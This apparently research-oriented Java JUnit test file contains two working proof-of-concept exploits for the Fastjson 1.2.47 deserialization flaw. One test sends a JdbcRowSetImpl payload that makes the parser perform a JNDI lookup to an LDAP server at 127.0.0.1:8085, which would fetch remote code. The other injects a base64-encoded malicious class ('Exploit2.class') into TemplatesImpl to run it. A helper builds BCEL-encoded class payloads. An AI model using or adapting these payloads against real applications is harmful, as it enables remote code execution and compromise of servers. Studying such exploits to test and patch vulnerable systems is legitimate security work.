package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import me.mole.pojo.Student;
import org.apache.tomcat.util.codec.binary.Base64;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.HashMap;

public class Fastjson1247ApplicationTest {

    /*
    {
      "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
      },
      "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://127.0.0.1:8085/abc",
        "autoCommit": true
      }
     }
     */
    @Test
    public void test_1247_poc_1() {
        String fj_poc = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/abc\",\"autoCommit\":true}}";
        System.out.println(fj_poc);
        JSON.parseObject(fj_poc, Student.class);
    }

    /*
     {
      "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
      },
      "b": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": ["...<clazz-byte-codes-base64>..."],
        "_name": "a.b",
        "_tfactory": {},
        "_outputProperties": {}
       }
     }
     */
    @Test
    public void test_1247_poc_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit2.class";
        String evilClazzB64 = readClass(evilClassPath);
        String fj_poc = "{\n" +
                " \"a\": {\n" +
                "   \"@type\": \"java.lang.Class\",\n" +
                "   \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\n" +
                " },\n" +
                " \"b\": {\n" +
                "   \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "   \"_bytecodes\": [\"" + evilClazzB64 + "\"],\n" +
                "   \"_name\": \"a.b\",\n" +
                "   \"_tfactory\": {},\n" +
                "   \"_outputProperties\": {}\n" +
                "  }\n" +
                "} ";
        System.out.println(fj_poc);
        JSONObject jsonObject = JSON.parseObject(fj_poc, Feature.SupportNonPublicField);
    }

    private String readClass(String clazzPath){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    private String readClassToBCEL(String clazzPath) {
        String bcelCode = "$$BCEL$$";
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
            bcelCode += Utility.encode(bos.toByteArray(), true);
            return bcelCode;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}
